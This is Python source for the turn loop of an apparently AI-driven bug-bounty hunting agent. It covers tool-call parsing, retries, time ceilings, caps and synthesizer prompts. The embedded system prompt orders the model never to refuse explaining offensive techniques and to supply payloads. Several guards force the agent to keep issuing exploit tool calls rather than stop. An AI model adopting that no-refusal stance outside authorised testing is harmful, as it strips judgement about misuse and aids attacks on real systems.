- EDUCATIONAL & TECHNIQUE QUERIES: When the researcher asks about offensive security techniques (e.g. 403 bypass, IDOR, SQLi, XSS, SSRF, JWT attacks, auth bypass, privilege escalation, parameter pollution), provide comprehensive, detailed technical explanations with concrete examples, payloads, headers, and methodology. This is educational content essential to bug bounty work — NEVER refuse to explain a technique. You are a bug bounty assistant, not a content filter.
- OUTPUT FORMAT: Respond in plain natural-language prose with clean markdown structure (headings, bullet points, and code blocks for evidence/PoC). NEVER output a raw tool-call object. Default to a short, flowing explanation (a few paragraphs, not a numbered section per tool call) — reach for headings/sections only when the researcher actually asked for a report or the content genuinely needs that structure to stay readable (e.g. comparing several distinct findings).
- The conversation history above may end with one or more raw {{"tool": ...}} JSON objects — these are the orchestrator's own failed or stuck tool-call attempts from earlier this turn (malformed JSON, a repeated call, or it simply ran out of attempts), not a real result and not anything the researcher has seen. NEVER copy, quote, or reproduce that JSON — not even inside a code block — as your answer. Treat it as if it weren't there: summarize strictly from the real tool results that actually came back (visible as [TOOL RESULT: ...] entries), and if nothing useful came back at all, say so plainly instead of echoing the stuck attempt.
- VOICE: Talk directly TO the researcher, second person ("you asked me to...", "I tried...", "your session cookie..."). Never narrate about them in third person ("the researcher instructed...", "the researcher's goal was..." ) — that's report-doc phrasing, not how you'd actually talk to the person sitting across from you. Save strict third-person, formal phrasing for an actual generated HackerOne report artifact, not a normal reply.
"""

        turn_start_idx = len(self.history)
        self.history.append({"role": "user", "content": user_text})
        # Snapshot for the auto-continue decision at the end of this turn —
        # see the `_should_auto_continue` block right before `return
        # final_response`. A finding recorded DURING this turn is one of
        # the conditions that stops auto-continuation (the researcher asked
        # to be shown a found vuln, not have it quietly logged while the
        # agent keeps going).
        _findings_count_at_turn_start = len(self.target.findings) if isinstance(self.target.findings, list) else 0
        tools_executed = []
        # Separate from tools_executed above: only tool calls that actually
        # DID something new (not a dedup/no-op skip like record_finding
        # returning "already_recorded", or jwt_forge returning "skipped")
        # count toward "this turn ran real tool work" for the purpose of
        # picking the full doctrine-heavy synth prompt vs the light casual
        # one below. Without this, a pure-chat follow-up ("explain that
        # bug again", "nice work!") that only touches a no-op record_finding
        # call still looked like a real hunting turn and got the full
        # report-register prompt instead of a normal conversational reply.
        _NO_OP_TOOL_STATUSES = {"skipped", "already_recorded", "blocked_previously_dismissed", "no_title_given", "no_reason_given", "nothing_to_dismiss"}
        _productive_tools_executed = []
        # Hard cap on record_finding per turn — enforced here, not just
        # requested in the prompt. Prompt instructions are advisory; the
        # model has repeatedly ignored "don't re-record" wording and kept
        # calling record_finding 5-10+ times in a single turn (recap
        # follow-ups, praise, even a meta-question about its own behavior).
        # Once this cap is hit, further record_finding calls in THIS turn
        # are refused before the executor even runs — deterministic, not
        # dependent on the model choosing to listen.
        _RECORD_FINDING_CAP_PER_TURN = 3
        _record_finding_calls_this_turn = 0
        ai_resp = None  # stays None if has_real_target is False and the
                         # loop below never runs — without this, referencing
                         # it in the final-answer fallback chain crashes with
                         # UnboundLocalError on any target-less conversation.
        _prev_ai_resp = None
        _executed_signatures = set()  # every (tool, args) run this turn — not just the last one
        _dup_skip_count = 0
        _narration_retry_count = 0
        _premature_done_retry_count = 0
        # ── Turn-diagnostics telemetry ──
        # Ground truth for *why* a turn behaved the way it did (timed out,
        # needed "continue", truncated a batch, got an approval denied),
        # captured as it actually happens rather than reconstructed/guessed
        # after the fact. Stored on target.state at the end of this turn so
        # a later "why did you do that?" from the researcher can be
        # answered from real recorded facts — see _DIAG_QUESTION_RE /
        # _format_last_turn_diagnostics and the short-circuit at the top of
        # this method.
        _diag_batches_truncated = 0
        _diag_truncated_calls = 0
        _diag_provider_retries = 0
        _diag_provider_gaveup = False
        self._approvals_granted_this_turn = 0
        self._approvals_denied_this_turn = 0
        _turn_t0 = time.time()
        # Extra full-call retries at the orchestrator level, on top of
        # ai_utils.call_nvidia's own internal retry-with-backoff — this is
        # the backstop for a provider outage that outlasts even that (or
        # for a provider path, e.g. call_ollama, that doesn't have the
        # same internal retry coverage).
        _PROVIDER_RETRY_ATTEMPTS = 3

        # Wall-clock ceiling alongside the iteration-COUNT ceiling
        # (max_iterations). Observed in practice: a slow local orchestrator
        # model producing slightly-different-each-time tool-call text that
        # never quite parses cleanly AND never quite repeats identically
        # (defeating the _prev_ai_resp dedup check a few lines below) can
        # burn through a large chunk of a 60-iteration budget on pure
        # inference latency alone, with zero tools ever actually
        # dispatched — one real case ran ~19 minutes this way. 60 iterations
        # is a reasonable count-based ceiling when each one is fast; it's
        # not a reasonable TIME budget when each one isn't. This caps the
        # worst case regardless of which exact retry path is looping.
        _loop_deadline = time.time() + 240  # 4 minutes
        # Absolute outer ceiling — the rolling idle-budget below pushes
        # _loop_deadline out every time a tool genuinely finishes, so a
        # long, productive engagement (lots of real curl/spider/nuclei
        # calls) is never starved. But "rolling, with no upper bound" is
        # itself a risk (a turn that keeps making SLOW but real progress
        # forever never ends) — this is the backstop: no single turn runs
        # past 20 minutes of wall clock, full stop, regardless of how much
        # of that was legitimate tool work.
        _hard_ceiling = time.time() + 1200  # 20 minutes
        _timed_out = False

        # A path scope set in an earlier turn (e.g. "...from this endpoint
        # https://host/app") persists across the session — most follow-up
        # messages ("go for it", "try exploiting that flaw") won't repeat the
        # URL, but the restriction to that application's path should still hold.
        # Only overwrite it when this message names a new path explicitly.
        _new_scope = extract_path_scope(user_text)
        if _new_scope:
            self._turn_path_scope = _new_scope

        # ── 3. Orchestrator Iteration Loop ──
        # Only enter the tool loop when there's a real target AND this turn
        # isn't confidently conversational (_skip_orchestrator_loop, checked
        # above — a code-level gate, not just the prompt's own Rule 1). The
        # model still makes the real judgment call for anything not caught
        # by that gate; this only removes the loop entirely for the clear
        # cases instead of trusting the prompt to self-regulate every time.
        #
        # CAUGHT IN THE WILD (2026-09): this gate was has_real_target-only,
        # which meant a target-less "generate a sample report so I can see
        # it" had NO path into this loop at all — export_report never
        # requires a target (it's local/memory-only, already exempted from
        # scope checks in execute_tool_call), but the model had zero actual
        # mechanism to call it. Result: it fabricated a fake tool-call JSON
        # blob as its final answer instead of ever touching the filesystem
        # — nothing was generated, it just looked like something was.
        # report_requested is added here so target-independent report/export
        # requests can still reach real tool execution with no target set.
        if (has_real_target or report_requested) and not _skip_orchestrator_loop:
            for iteration in range(max_iterations):
                self._current_turn = iteration + 1
                if cancel_check and cancel_check():
                    break
                if time.time() > _loop_deadline or time.time() > _hard_ceiling:
                    # Stop BEFORE starting another slow inference call, not
                    # after — the goal is capping wall-clock time actually
                    # spent, not just adding one more check at the end of
                    # an iteration that already ran long.
                    _timed_out = True
                    break

                if emit and hasattr(emit, "set_label"):
                    emit.set_label("Let me think")

                def _call_orchestrator():
                    return ask_neural_core(
                        prompt=user_text if iteration == 0 else "Continue analysis based on tool results. Choose next tool or output 'DONE'.",
                        system_prompt=_get_orchestrator_system_prompt(),
                        role="orchestrator",
                        thinking=False,
                        history=self._get_trimmed_history(max_turns=6, for_chat=False, turn_start_idx=turn_start_idx),
                        return_usage=True,
                        cancel_check=cancel_check,
                        tools=Agent._build_native_tools()
                    )

                ai_resp, tokens = _call_orchestrator()

                if tokens is not None and emit and hasattr(emit, "set_token_count"):
                    emit.set_token_count(tokens)

                def _orch_failed(resp):
                    return (not resp) or (isinstance(resp, str) and resp.startswith("Error:"))

                if _orch_failed(ai_resp):
                    # Provider-level error or empty completion. call_nvidia
                    # already retries internally with real exponential
                    # backoff (see ai_utils._post_with_retry) across both
                    # 5xx/429 AND connection-level exceptions — so landing
                    # here at all means that already failed several times.
                    # This used to be exactly ONE extra attempt and then an
                    # unconditional give-up for the whole iteration, which is
                    # exactly what forced the researcher to type "continue"
                    # on anything longer than a single bad moment. Give it a
                    # few more full attempts, each with its own growing
                    # backoff, before actually giving up.
                    _provider_backoff = 2.0
                    for _provider_attempt in range(_PROVIDER_RETRY_ATTEMPTS):
                        _diag_provider_retries += 1
                        if emit and hasattr(emit, "set_label"):
                            emit.set_label(
                                f"Wait a minute.. some issue on my end. Let me cook again "
                                f"({_provider_attempt + 1}/{_PROVIDER_RETRY_ATTEMPTS})..."
                            )
                        time.sleep(_provider_backoff)
                        _provider_backoff = min(_provider_backoff * 2, 15.0)
                        ai_resp, tokens = _call_orchestrator()
                        if tokens is not None and emit and hasattr(emit, "set_token_count"):
                            emit.set_token_count(tokens)
                        if not _orch_failed(ai_resp):
                            break
                    if _orch_failed(ai_resp):
                        # Still failing after every retry — do NOT let this raw
                        # error string ride along as `ai_resp` into the final
                        # `final_answer or ai_resp or fallback` chain below;
                        # that was leaking "Error: NVIDIA NIM API returned
                        # 500 - ..." straight to the researcher whenever
                        # synthesis also failed. Clear it so only the
                        # friendly fallback can surface. Record it for
                        # diagnostics so a later "why did you stop?" gets a
                        # real answer instead of a guess.
                        _diag_provider_gaveup = True
                        ai_resp = None
                        break

                # Check if ask_neural_core returned a native tool call object (dict)
                tool_call = None
                if isinstance(ai_resp, dict) and "tool" in ai_resp:
                    tool_call = ai_resp
                    # Create a string representation for logging & prev check
                    ai_resp = json.dumps(tool_call)

                if isinstance(ai_resp, str) and not ai_resp.strip():
                    break

                # Guard against the orchestrator re-entering with the exact same
                # output it just produced (identical plan/tool-call regenerated
                # instead of progressing) — treat that as "done planning" and
                # fall through to synthesis rather than burning iterations.
                if isinstance(ai_resp, str) and ai_resp.strip() == (_prev_ai_resp or "").strip():
                    break
                if isinstance(ai_resp, str):
                    _prev_ai_resp = ai_resp

                # Check for JSON tool invocation in text response (if native tool call didn't return a dict)
                if not tool_call and isinstance(ai_resp, str):
                    json_match = re.search(r'```(?:json)?\s*(\{[\s\S]*?\})\s*```', ai_resp)
                    if json_match:
                        try:
                            parsed = json.loads(json_match.group(1))
                            if isinstance(parsed, dict) and "tool" in parsed:
                                tool_call = parsed
                        except Exception:
                            pass

                # Balanced-brace scan — catches tool-call JSON that's well-formed
                # except for stray trailing content after it (e.g. one extra
                # '}'), which the older greedy regexes below fail on outright.
                if not tool_call and isinstance(ai_resp, str) and '"tool"' in ai_resp:
                    parsed = _extract_first_balanced_json(ai_resp)
                    if isinstance(parsed, dict) and "tool" in parsed:
                        tool_call = parsed

                if not tool_call and isinstance(ai_resp, str):
                    tool_json_match = re.search(r'(\{\s*"tool"\s*:\s*[\s\S]*\})', ai_resp)
                    if tool_json_match:
                        try:
                            parsed = json.loads(tool_json_match.group(1))
                            if isinstance(parsed, dict) and "tool" in parsed:
                                tool_call = parsed
                        except Exception:
                            pass

                if not tool_call:
                    # Catch patterns like: record_finding { ... } or (Suggested next tool: record_finding { ... })
                    for reg_tool in TOOL_REGISTRY.keys():
                        pattern = rf'(?:Suggested next tool:\s*)?\b({reg_tool})\b\s*(\{{[\s\S]*\}})'
                        m = re.search(pattern, ai_resp, re.IGNORECASE)
                        if m:
                            t_name_matched = m.group(1).lower()
                            t_args_str = m.group(2).rstrip(" \t\n\r)")
                            try:
                                parsed_args = json.loads(t_args_str)
                                if isinstance(parsed_args, dict):
                                    tool_call = {"tool": t_name_matched, "args": parsed_args}
                                    break
                            except Exception:
                                pass

                if tool_call and tool_call.get("tool") in TOOL_REGISTRY:
                    # The response may contain MORE than one tool-call JSON
                    # object batched back to back (small/local orchestrator
                    # models do this constantly — see _extract_all_tool_calls).
                    # Run every registered one found here, in order, within
                    # THIS iteration, instead of executing only `tool_call`
                    # (the first) and silently dropping the rest. This is
                    # what used to force a narration-retry/timeout spiral:
                    # the model wasn't wrong to want 5 curls, it just never
                    # got credit for more than one of them before the turn
                    # ran out of budget.
                    _batch = _extract_all_tool_calls(ai_resp) if isinstance(ai_resp, str) else [tool_call]
                    if not _batch or tool_call not in _batch:
                        _batch = [tool_call]
                    # Safety cap, independent of the destructive-action
                    # approval gate below: one model response batching an
                    # unreasonable number of calls (runaway generation, a
                    # degenerate repeat pattern) shouldn't be able to fire
                    # them all blind. Anything past the cap is left for the
                    # model to re-request next iteration, after it's had a
                    # chance to see these results first — same as it would
                    # for a single call that needed a follow-up.
                    _MAX_BATCH_PER_RESPONSE = 15
                    if len(_batch) > _MAX_BATCH_PER_RESPONSE:
                        _diag_batches_truncated += 1
                        _diag_truncated_calls += len(_batch) - _MAX_BATCH_PER_RESPONSE
                        _batch = _batch[:_MAX_BATCH_PER_RESPONSE]

                    self.history.append({"role": "assistant", "content": ai_resp})
                    _last_t_name = None
                    _last_tool_result = None
                    _batch_ran_anything = False

                    for _bt_call in _batch:
                        if cancel_check and cancel_check():
                            break
                        if time.time() > _hard_ceiling:
                            _timed_out = True
                            break

                        t_name = _bt_call.get("tool")
                        if t_name not in TOOL_REGISTRY:
                            # Mixed batch — skip the invalid one, keep going
                            # on the rest rather than aborting the whole batch.
                            self.history.append({
                                "role": "user",
                                "content": f"[TOOL ERROR] '{t_name}' is not a valid tool. Available tools: {', '.join(TOOL_REGISTRY.keys())}"
                            })
                            continue
                        t_args = _bt_call.get("args") or _bt_call.get("parameters") or _bt_call.get("arguments") or {}

                        # Already ran this exact tool+args earlier THIS turn (not
                        # just last iteration) -> skip it, don't re-dispatch.
                        _sig = (t_name, json.dumps(t_args, sort_keys=True, default=str))
                        if _sig in _executed_signatures:
                            _dup_skip_count += 1
                            self.history.append({
                                "role": "user",
                                "content": f"[TOOL SKIPPED] '{t_name}' with these exact args already ran earlier this turn — reuse those results instead of repeating it."
                            })
                            continue
                        _executed_signatures.add(_sig)

                        # Hard cap: record_finding specifically, enforced before
                        # execution — see _RECORD_FINDING_CAP_PER_TURN comment above.
                        if t_name == "record_finding":
                            _record_finding_calls_this_turn += 1
                            if _record_finding_calls_this_turn > _RECORD_FINDING_CAP_PER_TURN:
                                blocked_result = {
                                    "status": "blocked",
                                    "note": (
                                        f"Hard cap hit — that's {_record_finding_calls_this_turn} record_finding "
                                        f"calls this turn, capped at {_RECORD_FINDING_CAP_PER_TURN}. Whatever you're "
                                        f"trying to log, it's a variation of something already recorded — stop "
                                        f"logging and move on to the next real step, or finish up."
                                    )
                                }
                                if emit and hasattr(emit, "tool_result"):
                                    emit.tool_result(t_name, blocked_result)
                                self.history.append({
                                    "role": "user",
                                    "content": f"[TOOL BLOCKED] {blocked_result['note']}"
                                })
                                continue

                        tools_executed.append(t_name)
                        _batch_ran_anything = True

                        if emit and hasattr(emit, "set_label"):
                            emit.set_label(f"Yep, here we go — running {t_name}")

                        if emit and hasattr(emit, "tool_start"):
                            emit.tool_start(t_name, t_args)
                        elif emit and hasattr(emit, "info"):
                            emit.info(f"[*] Executing tool: {t_name} with args: {t_args}")

                        tool_result = self.execute_tool_call(t_name, t_args, emit)

                        if not (isinstance(tool_result, dict) and tool_result.get("status") in _NO_OP_TOOL_STATUSES):
                            _productive_tools_executed.append(t_name)
                            # _loop_deadline is a rolling idle-time budget, not a
                            # fixed total-turn budget — it exists to kill a
                            # stuck loop that's burning iterations on inference
                            # alone with NOTHING actually dispatched (see the
                            # comment where it's first set). A tool that just
                            # ran for real (e.g. spider legitimately taking
                            # 200+s on a deep crawl) is progress, not a stall —
                            # extend the clock so the NEXT step in a genuinely
                            # long, productive engagement isn't cut off right
                            # as it's getting started. This rolling extension
                            # has no per-extension cap of its own — a turn that
                            # keeps making real (if slow) progress forever is
                            # bounded instead by the absolute _hard_ceiling
                            # (20 min wall clock) set above, which this can
                            # never push past.
                            if _dup_skip_count == 0 and tools_executed.count(t_name) <= 12:
                                _loop_deadline = min(max(_loop_deadline, time.time() + 240), _hard_ceiling)

                        if emit and hasattr(emit, "tool_result"):
                            emit.tool_result(t_name, tool_result)

                        self.history.append({
                            "role": "user",
                            "content": f"[TOOL RESULT: {t_name}]\n{json.dumps(tool_result, indent=2)}"
                        })
                        _last_t_name = t_name
                        _last_tool_result = tool_result

                    if emit and hasattr(emit, "set_label"):
                        emit.set_label("Got there — checking results")

                    if _timed_out:
                        break

                    if not _batch_ran_anything:
                        # Everything in the batch was a dup/invalid/capped —
                        # nudge forward instead of re-asking for the exact
                        # same batch again.
                        user_text = "Those were already handled above. Choose a different next tool, or output 'DONE' if the investigation is complete."
                        continue

                    if len(_batch) > 1:
                        user_text = (
                            f"Ran {len([c for c in _batch if c.get('tool') in TOOL_REGISTRY])} tool call(s) from your last response "
                            f"(results for each are above). Evaluate these findings and choose the next tool, or output 'DONE'."
                        )
                    else:
                        user_text = f"Tool '{_last_t_name}' returned:\n{json.dumps(_last_tool_result, indent=2)}\nEvaluate these findings."
                    continue

                elif tool_call:
                    # Hallucinated or unregistered tool name
                    unregistered_name = tool_call.get("tool", "unknown")
                    if emit and hasattr(emit, "set_label"):
                        emit.set_label("Got there — checking results")

                    self.history.append({"role": "assistant", "content": ai_resp})
                    self.history.append({
                        "role": "user",
                        "content": f"[TOOL ERROR] '{unregistered_name}' is not a valid tool. Available tools: {', '.join(TOOL_REGISTRY.keys())}"
                    })
                    user_text = f"Tool '{unregistered_name}' is invalid. Please select from available tools: {', '.join(TOOL_REGISTRY.keys())}"
                    continue

                elif isinstance(ai_resp, str) and '"tool"' in ai_resp and _narration_retry_count < 5:
                    # It was clearly attempting a tool call (has a "tool" key)
                    # but every extraction attempt above — including the
                    # balanced-brace scanner — still failed to parse it as
                    # valid JSON. This used to fall straight through to the
                    # narration check (which won't catch it, there's no
                    # narration wording here) and then to `break`, leaking
                    # the raw broken JSON to the researcher as if it were the
                    # final answer, with the intended tool call never run.
                    # Force a clean retry instead of silently giving up.
                    _narration_retry_count += 1
                    self.history.append({"role": "assistant", "content": ai_resp})
                    self.history.append({
                        "role": "user",
                        "content": (
                            "SYSTEM: That was not valid JSON — it looked like a tool call "
                            "but failed to parse (check for mismatched braces/quotes, "
                            "especially inside string args like payload content). "
                            "Resend the SAME tool call as a single valid JSON object, "
                            "nothing else before or after it."
                        )
                    })
                    user_text = "Resend the tool call as valid JSON only."
                    continue

                # Non-tool response — could be a genuine "DONE"/conversational
                # reply, OR the model narrating an intended action instead of
                # actually emitting the tool-call JSON (e.g. "Let me check the
                # target now.") — the latter must NOT be allowed to silently
                # end the turn, or the whole session does nothing but talk.
                _narration_markers = (
                    "let me ", "i'll ", "i will ", "let's ", "going to ",
                    "i'm going to", "proceed to", "next, i", "now i",
                    "i'll now", "i will now", "i need to", "i should",
                    "first, i", "starting with", "beginning", "let me execute",
                    "executing now", "initiating", "i'm about to",
                    "i can ", "i want to", "my plan", "here's my",
                    "let me check", "let me run", "let me fetch",
                    "i'm now", "i shall", "allow me", "i'm going",
                    "next:", "next step", "the next step", "will fetch",
                    "will probe", "will analyze", "will inspect", "harvest",
                    "examine", "investigate",
                )
                _next_step_markers = ("next:", "next step", "the next step", "proceed to", "will fetch", "will probe", "will analyze", "will inspect", "harvest", "let me ")
                _resp_lower = ai_resp.lower()
                _has_explicit_completion = bool(re.search(r"^\s*done\b|^\s*\[status:\s*(objective achieved|full takeover|exhausted)\]", _resp_lower, re.MULTILINE))
                _has_next_step = any(m in _resp_lower for m in _next_step_markers)

                # Deterministic guard: `load_skill` is prep, not mission
                # progress (see doctrine rule 10). Prompt instructions are
                # advisory — the model has been observed calling
                # load_skill, then immediately outputting a bare "DONE"
                # with nothing actually run against the target, leaving the
                # researcher to manually type "continue". Catch that here
                # instead of trusting the prompt alone: if the only tool(s)
                # executed this turn are load_skill and the model just
                # tried to end the turn with an explicit DONE while a real
                # target/mission is active, push back and force it to keep
                # going. Bounded retries so a session that genuinely has
                # nothing further to do (e.g. the skill itself was the ask)
                # doesn't loop forever.
                _only_load_skill_so_far = tools_executed and all(t == "load_skill" for t in tools_executed)
                if (
                    _has_explicit_completion
                    and _only_load_skill_so_far
                    and has_real_target
                    and _premature_done_retry_count < 3
                ):
                    _premature_done_retry_count += 1
                    self.history.append({"role": "assistant", "content": ai_resp})
                    self.history.append({
                        "role": "user",
                        "content": (
                            "SYSTEM: load_skill only loads reference methodology — it doesn't touch the "
                            f"target and isn't mission progress by itself. The target is '{self._display_host}' "
                            f"and the mission is still: '{original_user_text}'. Continue now with the actual "
                            "recon/exploit tool calls the skill just told you to make — do not stop here."
                        )
                    })
                    user_text = "Continue — emit the next real tool call now, do not output DONE yet."
                    continue

                _looks_like_narration = (
                    (_has_next_step or any(m in _resp_lower for m in _narration_markers))
                    and not _has_explicit_completion
                )

                # Primary narration guard: enforce continuous tool execution until explicit completion
                if _looks_like_narration and _narration_retry_count < 5:
                    _narration_retry_count += 1
                    self.history.append({"role": "assistant", "content": ai_resp})
                    # Build a target-aware example so the model knows what to emit
                    _target_url = self._display_host
                    if not _target_url.startswith(("http://", "https://")):
                        _target_url = f"http://{_target_url}"
                    self.history.append({
                        "role": "user",
                        "content": (
                            f"SYSTEM: Your previous text was DISCARDED — it performed no action and produced no results. "
                            f"The target is '{self._display_host}'. The mission is: '{original_user_text}'. "
                            f"Emit ONLY tool-call JSON. Example: "
                            f'{{"tool": "curl", "args": {{"url": "{_target_url}", "method": "GET"}}}}. '
                            f"No English text. No explanation. No preamble. Just the raw JSON object."
                        )
                    })
                    user_text = "Execute the tool now — respond with ONLY the JSON, no narration."
                    continue

                # Secondary narration guard: tools already executed but model narrates next step
                if _looks_like_narration and tools_executed and _narration_retry_count < 5:
                    _narration_retry_count += 1
                    self.history.append({"role": "assistant", "content": ai_resp})
                    self.history.append({
                        "role": "user",
                        "content": (
                            "SYSTEM: You described an intended next action instead of executing it. "
                            "Emit the tool-call JSON now or output 'DONE' if no further tools are needed. "
                            "No narration, no explanation — just JSON or DONE."
                        )
                    })
                    user_text = "Emit the tool-call JSON or DONE."
                    continue

                # Safety net: narration retries exhausted, real target exists.
                # Previously this only fired when ZERO tools had executed yet
                # this turn — so a turn that ran a setup tool (e.g.
                # listener(action=start)) and then got stuck narrating its next
                # step ("next I will probe the survey endpoint...") never hit
                # this recovery; it just fell straight to synthesis with the
                # setup done but the actual exploit attempt never made,
                # producing a "here's my plan" answer instead of a result.
                # Now it fires either way — zero tools gets the generic bootstrap
                # probe as before; some-tools-already-run gets a stronger,
                # mission-specific push instead of being handed to synthesis.
                if has_real_target and _narration_retry_count >= 5:
                    if not tools_executed:
                        _target_url = self._display_host
                        if not _target_url.startswith(("http://", "https://")):
                            _target_url = f"http://{_target_url}"
                        tool_call = {"tool": "curl", "args": {"url": _target_url, "method": "GET"}}
                        t_name = tool_call["tool"]
                        t_args = tool_call["args"]
                        tools_executed.append(t_name)
                        _productive_tools_executed.append(t_name)
                        if emit and hasattr(emit, "set_label"):
                            emit.set_label(f"Let me cook — probing {self._display_host}")
                        if emit and hasattr(emit, "tool_start"):
                            emit.tool_start(t_name, t_args)
                        elif emit and hasattr(emit, "info"):
                            emit.info(f"[*] Auto-probe: {t_name} {t_args}")
                        tool_result = self.execute_tool_call(t_name, t_args, emit)
                        if emit and hasattr(emit, "tool_result"):
                            emit.tool_result(t_name, tool_result)
                        self.history.append({"role": "assistant", "content": '{"tool": "curl", "args": ' + json.dumps(t_args) + '}'})
                        self.history.append({
                            "role": "user",
                            "content": f"[TOOL RESULT: {t_name}]\n{json.dumps(tool_result, indent=2)}"
                        })
                        user_text = f"Tool '{t_name}' returned results. Analyze these findings and choose the next tool or output 'DONE'."
                        _narration_retry_count = 0  # Reset for the next phase
                        continue
                    elif _narration_retry_count < 8:
                        # Some tool(s) already ran but it's still describing the
                        # next step instead of doing it. Push harder, quoting
                        # exactly what's already been run and what was asked for,
                        # rather than silently handing an "infra set up, exploit
                        # never attempted" turn to synthesis.
                        _narration_retry_count += 1
                        self.history.append({"role": "assistant", "content": ai_resp})
                        self.history.append({
                            "role": "user",
                            "content": (
                                f"SYSTEM: You keep describing the next step instead of doing it. "
                                f"You already ran: {', '.join(tools_executed)}. "
                                f"The mission is still: '{original_user_text}'. "
                                f"Emit ONLY the next tool-call JSON that actually attempts it — "
                                f"no narration, no plan, no explanation."
                            )
                        })
                        user_text = "Execute the tool now — respond with ONLY the JSON."
                        continue
                    # Even the extra pushes didn't produce a real tool call —
                    # genuinely stuck. Fall through to synthesis with whatever
                    # was gathered, same as the original behavior.

                break


        # ── 4. Final Answer Generation (Streaming, Fast & Context-Specific) ───────
        if emit and hasattr(emit, "set_label"):
            emit.set_label("Got there — wrapping up")

        cfg = load_config()
        self.last_tool_count = len(tools_executed)

        # Branch point: only turns that actually ran a hunting tool (or are
        # generating a report off prior confirmed findings) get the heavy
        # target/scope/doctrine prompt. Everything else — plain conversation,
        # Q&A, "no real target" turns — gets the lightweight persona prompt.
        # This is the fix for both the TARGET:-default leak and the model
        # quoting its own baseline doctrine back in casual replies.
        #
        # CAUGHT IN THE WILD (2026-09): now that the orchestrator loop above
        # can run target-independent tools (export_report, record_finding,
        # etc.) with no real target configured — see the report_requested
        # addition to that gate — _productive_tools_executed can be
        # non-empty on a target-less turn (e.g. a sample export_report run).
        # Gating on _productive_tools_executed alone would then route that
        # turn into full_synth_prompt, which unconditionally prints
        # "TARGET: default" — exactly the leak this branch point was
        # originally built to prevent. target_configured is now required
        # alongside it, so a target-less local-tool run still gets the
        # doctrine-free casual prompt (which has its own instruction, added
        # below, against echoing raw tool-call JSON).
        synthesizer_system_prompt = (
            full_synth_prompt
            if (target_configured and (_productive_tools_executed or (report_requested and has_critical_findings)))
            else casual_synth_prompt
        )

        def _is_provider_failure(answer):
            return (not answer) or (isinstance(answer, str) and answer.startswith("Error:"))

        def _ask_synthesizer(prompt, hist):
            """Synthesizer call with retries (with backoff) on an empty
            completion or a provider-level error string (e.g. transient
            5xx/connection blip) — these are not worth surfacing to the
            researcher as-is, and a single bad moment in the cloud
            shouldn't kill the whole write-up.

            tools + tool_choice="none": the synthesizer is given the SAME
            tool schema as the orchestrator but is explicitly forbidden
            from calling one. This keeps the model in a consistently
            tool-aware frame of reference for the entire turn instead of
            being dropped into a schema-free completion right after a
            history full of the orchestrator's own raw tool-call JSON —
            that mismatch (tool-aware call → tool-naive call, same
            conversation) was the actual root cause of the model
            sometimes echoing raw `{"tool": ...}` text back as its
            "final answer" instead of writing prose. _clean_synthesizer_
            output() and chat_ui's raw-JSON stream guard remain as
            further defense-in-depth if a provider ever doesn't honor
            tool_choice="none".
            """
            _synth_tools = Agent._build_native_tools()
            answer, tok = ask_neural_core(
                prompt=prompt,
                system_prompt=synthesizer_system_prompt,
                role="synthesizer",
                thinking=False,
                history=hist,
                on_token=on_token,
                return_usage=True,
                cancel_check=cancel_check,
                tools=_synth_tools,
                tool_choice="none",
            )
            if _is_provider_failure(answer):
                logger.debug(f"Synthesizer call failed ({answer!r}), retrying.")
                _synth_backoff = 1.5
                for _synth_attempt in range(_PROVIDER_RETRY_ATTEMPTS):
                    if emit and hasattr(emit, "set_label"):
                        emit.set_label(
                            f"Wait a minute.. some issue on my end. Let me cook again "
                            f"({_synth_attempt + 1}/{_PROVIDER_RETRY_ATTEMPTS})..."
                        )
                    time.sleep(_synth_backoff)
                    _synth_backoff = min(_synth_backoff * 2, 15.0)
                    answer2, tok2 = ask_neural_core(
                        prompt=prompt,
                        system_prompt=synthesizer_system_prompt,
                        role="synthesizer",
                        thinking=False,
                        history=hist,
                        on_token=on_token,
                        return_usage=True,
                        cancel_check=cancel_check,
                        tools=_synth_tools,
                        tool_choice="none",
                    )
                    if not _is_provider_failure(answer2):
                        answer, tok = answer2, (tok2 if tok2 is not None else tok)
                        break
                else:
                    # Every attempt failed — don't leak the raw provider error
                    # string into the transcript as if it were a real answer.
                    answer, tok = None, tok
            return answer, tok

        # ── Interrupted-turn short-circuit ──────────────────────────────
        # Ctrl+C sets cancel_check(); the orchestrator loop above stops
        # calling new tools once it notices, but before this fix the code
        # fell straight into the normal "turn completed" synthesis prompts
        # below — which assume a natural DONE and can lead the synthesizer
        # to echo a stray tool-call-shaped JSON object back as prose (seen
        # as "(Suggested next tool: ...)" in the transcript). Give it an
        # explicit interrupted framing instead so it reports what was
        # actually gathered before the cancel, and says plainly that the
        # turn was interrupted rather than pretending it finished.
        _was_cancelled = bool(cancel_check and cancel_check())

        if _was_cancelled:
            if tools_executed:
                synth_prompt = (
                    f"The researcher interrupted this analysis (Ctrl+C) before it "
                    f"reached a conclusion.\n\n"
                    f"Tools executed before the interrupt: {', '.join(tools_executed)}.\n\n"
                    f"Summarize plainly what was gathered from those tool results so "
                    f"far — what was tried, what was observed, anything found. State "
                    f"clearly at the start that this analysis was interrupted and is "
                    f"not a finished or conclusive result. Do NOT invent a status, a "
                    f"suggested next tool call, or claim anything was achieved beyond "
                    f"what the tool results above actually show."
                )
            else:
                synth_prompt = (
                    "The researcher interrupted this turn (Ctrl+C) before any tool "
                    "ran or a result was produced. Briefly acknowledge the "
                    "interruption and ask what they'd like to do next — do not "
                    "invent findings or a summary, since nothing was actually run."
                )

            final_answer, tokens = _ask_synthesizer(
                synth_prompt,
                self._get_trimmed_history(max_turns=6, for_chat=False, turn_start_idx=turn_start_idx)
            )
        elif _timed_out:
            # Hit the wall-clock ceiling (_loop_deadline/_hard_ceiling).
            # This USED TO mean "no tool ever successfully dispatched this
            # turn" unconditionally — true back when only one tool call
            # could land per iteration, so a stuck turn that never got a
            # single clean call through would burn the whole budget on
            # retries alone. That's no longer the only way to get here:
            # since the orchestrator can batch many real tool calls into
            # one response, a turn can run 40+ successful curls, record
            # several real findings, and STILL eventually hit the 20-minute
            # ceiling mid-investigation. Telling the synthesizer "nothing
            # was dispatched, nothing was gathered" in that case is simply
            # false — the model (correctly) follows that instruction to the
            # letter and tells the researcher to just ask again, discarding
            # a real, substantial result and producing exactly the
            # "stuck, say continue" experience this is supposed to prevent.
            # Branch on what actually happened instead of assuming the
            # worst case every time.
            if tools_executed:
                synth_prompt = (
                    f"The researcher asked: \"{original_user_text}\"\n\n"
                    f"Tools executed before this turn's time budget ran out: {', '.join(tools_executed)}.\n\n"
                    f"This turn hit its time limit mid-investigation — it did NOT fail and did NOT "
